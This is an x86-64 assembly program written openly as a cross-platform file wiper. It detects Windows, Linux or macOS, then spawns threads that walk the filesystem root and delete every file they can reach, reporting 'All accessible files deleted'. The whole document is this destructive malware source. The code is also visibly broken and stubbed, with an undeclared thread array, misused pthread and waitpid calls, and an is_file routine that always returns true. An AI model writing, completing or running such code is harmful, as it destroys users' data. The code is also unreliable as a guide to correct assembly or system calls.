section .data
    root_dir_windows db "C:\", 0
    root_dir_linux db "/", 0
    root_dir_mac db "/", 0
    fmt_deleted db "Deleted: %s", 10, 0
    fmt_failed db "Failed to delete %s: %s", 10, 0
    fmt_all_deleted_windows db "All accessible files deleted on Windows.", 10, 0
    fmt_all_deleted_linux db "All accessible files deleted on Linux.", 10, 0
    fmt_all_deleted_mac db "All accessible files deleted on macOS.", 10, 0
    fmt_unsupported db "Unsupported operating system.", 10, 0
    fmt_dir_skipped db "Directory skipped: %s", 10, 0
    linux_os db "Linux", 0
    mac_os db "Darwin", 0

section .bss
    uname_buffer resb 65  ; Buffer for uname syscall
    file_check_buffer resb 256  ; Buffer for file checks

section .text
    global main
    extern printf
    extern remove
    extern opendir
    extern readdir
    extern closedir
    extern strcmp
    extern strcat
    extern fork
    extern waitpid
    extern pthread_create
    extern pthread_exit
    extern uname
    extern access  ; For checking file access permissions (Linux/macOS)
    extern GetFileAttributesA  ; For checking file attributes (Windows)

main:
    push rbp
    mov rbp, rsp

    ; Get OS type
    call get_os_type

    ; Compare OS type and call appropriate function
    cmp rax, 1
    je .windows
    cmp rax, 2
    je .linux
    cmp rax, 3
    je .mac

    ; Unsupported OS
    lea rdi, [fmt_unsupported]
    xor eax, eax
    call printf
    jmp .exit

.windows:
    lea rdi, [root_dir_windows]
    call spawn_delete_threads
    lea rdi, [fmt_all_deleted_windows]
    xor eax, eax
    call printf
    jmp .exit

.linux:
    lea rdi, [root_dir_linux]
    call spawn_delete_threads
    lea rdi, [fmt_all_deleted_linux]
    xor eax, eax
    call printf
    jmp .exit

.mac:
    lea rdi, [root_dir_mac]
    call spawn_delete_threads
    lea rdi, [fmt_all_deleted_mac]
    xor eax, eax
    call printf
    jmp .exit

.exit:
    mov rsp, rbp
    pop rbp
    xor eax, eax
    ret

; Spawn multiple threads to delete files in parallel
spawn_delete_threads:
    push rbp
    mov rbp, rsp

    ; Create multiple threads for deletion
    mov rcx, 4  ; Number of threads
.loop_spawn:
    dec rcx
    js .done_spawn

    lea rdi, [delete_files]  ; Pass the function to the thread
    lea rsi, [rdi]           ; Pass the root directory to the thread
    mov rdx, 0               ; Pass no additional argument
    call pthread_create      ; Create the thread
    test rax, rax
    jnz .error_spawn

    ; Save thread handle/ID
    mov [threads + rcx*8], rax
    jmp .loop_spawn

.error_spawn:
    ; Handle error in thread creation (optional)
    jmp .done_spawn

.done_spawn:
    ; Wait for all threads to complete
    mov rcx, 4  ; Number of threads
.loop_wait:
    dec rcx
    js .cleanup_spawn

    mov rdi, [threads + rcx*8]
    call waitpid  ; Wait for the thread to finish
    jmp .loop_wait

.cleanup_spawn:
    mov rsp, rbp
    pop rbp
    ret

; Recursively delete files and directories
delete_files:
    push rbp
    mov rbp, rsp
    sub rsp, 32  ; Allocate space for local variables

    ; Open directory
    mov rdi, rsi  ; rsi holds the root directory passed from the thread
    call opendir
    test rax, rax
    jz .cleanup  ; Exit if directory can't be opened
    mov r12, rax  ; Store directory handle

.loop:
    ; Read next directory entry
    mov rdi, r12
    call readdir
    test rax, rax
    jz .done

    ; Check if it's a file or directory
    mov rdi, rax
    call is_file
    test al, al
    jz .skip  ; Skip if it's a directory

    ; Try to delete the file
    mov rdi, rax
    call remove
    test eax, eax
    jnz .delete_failed

    ; Print deleted message
    lea rdi, [fmt_deleted]
    mov rsi, rax
    xor eax, eax
    call printf
    jmp .loop

.skip:
    ; Print directory skipped message
    lea rdi, [fmt_dir_skipped]
    mov rsi, rax
    xor eax, eax
    call printf
    jmp .loop

.delete_failed:
    ; Print failed message
    lea rdi, [fmt_failed]
    mov rsi, rax
    mov rdx, rax  ; Pass error message (simplified)
    xor eax, eax
    call printf
    jmp .loop

.done:
    ; Close directory
    mov rdi, r12
    call closedir

.cleanup:
    mov rsp, rbp
    pop rbp
    call pthread_exit  ; Exit the thread
    ret

; OS Detection
get_os_type:
    ; Check if uname syscall is available
    lea rdi, [uname_buffer]
    call uname

    ; Check if result is Linux
    lea rsi, [linux_os]
    call strcmp
    test rax, rax
    jz .linux_detected

    ; Check if result is Darwin (macOS)
    lea rsi, [mac_os]
    call strcmp
    test rax, rax
    jz .mac_detected

    ; If uname fails or returns unexpected result, check for file access (assume Windows)
    call test_file_access
    test al, al
    jz .windows_detected

    ; Default to Windows
.windows_detected:
    mov rax, 1
    ret

    ; If Linux detected
.linux_detected:
    mov rax, 2
    ret

    ; If macOS detected
.mac_detected:
    mov rax, 3
    ret

    ; Default to Windows if nothing else matches
    mov rax, 1
    ret

; Test file access (placeholder, replace with actual check)
test_file_access:
    ; Use access syscall to test file access
    ; On Linux/macOS, we could check if a specific file is accessible
    ; On Windows, this will be detected as part of the fallback
    
    ; Assuming /tmp/test_file.txt exists and is accessible
    mov rdi, [file_check_buffer]
    call access
    test eax, eax
    setz al
    ret

; Check if entry is a file
is_file:
    ; On Windows, use GetFileAttributes
    ; On Linux/macOS, use stat

    ; Example for Windows (pseudocode):
    ; call GetFileAttributesA
    ; test result with FILE_ATTRIBUTE_DIRECTORY
    ; if directory, return 0

    ; Example for Linux/macOS:
    ; mov rdi, filename
    ; call stat
    ; check st_mode for S_IFDIR (directory)

    mov al, 1  ; Assume it's a file
    ret
